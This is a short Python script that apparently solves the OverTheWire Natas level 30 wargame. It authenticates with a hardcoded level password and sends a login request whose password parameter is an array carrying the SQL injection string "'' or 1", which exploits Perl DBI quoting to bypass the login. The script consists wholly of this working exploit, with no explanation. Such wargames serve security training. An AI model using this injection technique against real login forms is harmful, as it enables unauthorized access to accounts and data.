import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

s = requests.Session()
s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')

args = { "username": "natas31", "password": ["'' or 1", 2] }
r = s.post(url,  data=args)
print (r.text)
